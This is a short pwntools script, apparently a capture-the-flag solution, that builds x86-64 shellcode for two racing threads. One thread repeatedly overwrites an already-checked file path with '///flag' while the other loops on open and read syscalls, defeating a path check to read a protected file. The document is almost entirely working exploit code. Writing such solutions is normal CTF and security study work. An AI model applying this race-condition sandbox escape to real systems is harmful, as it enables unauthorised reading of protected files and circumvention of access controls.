from pwn import *

context.arch='amd64'

# 0x67616c662f == '/flag\0\0\0'
# 0x1003000 - 0x20 == original filepath address
sc_thread_racing = '''
nop
mov esp, 0x1002800
/* rbx = original filepath */
mov eax, 0x1003000-0x20
mov rbx, QWORD ptr [rax]

/* rcx = "///flag" */
mov rcx, 0x67616c662f2f2f

/* write to VARS as they are no longer used */
mov al, 0
mov edi, eax

label:
    mov QWORD PTR [rdi], rcx
    nop /* int3 */
    xchg rcx, rbx
    jmp label
'''

sc_thread_open = '''
/* our path is written to VARS as they are no longer used */
mov dx, 0x1ff
mov rdi, 0x1002F00

xor esi, esi /* O_RDONLY */
label:
    xor eax, eax
    mov al, 2
    syscall
    test eax, eax
    js label

push rax
pop rdi
push rsp
pop rsi
xor eax, eax /* SYS_read */
syscall
mov eax, 0x1001600 /* EXITF */
pop rbx
jmp rax
'''
#sc_thread_racing = 'int3\n' * 0x28
bs_race = asm(sc_thread_racing) + b'\xcc'*1
bs_open = asm(sc_thread_open)

print("RACING thread")
print(disasm(bs_race))
print(bs_race)

print("OPENING thread")
print(disasm(bs_open))
print(bs_open)

full = (bs_race + bs_open)

print(disasm(full))
assert len(full) <= 0x50
print(full)
print("open_offset: {}".format(hex(len(bs_race))))
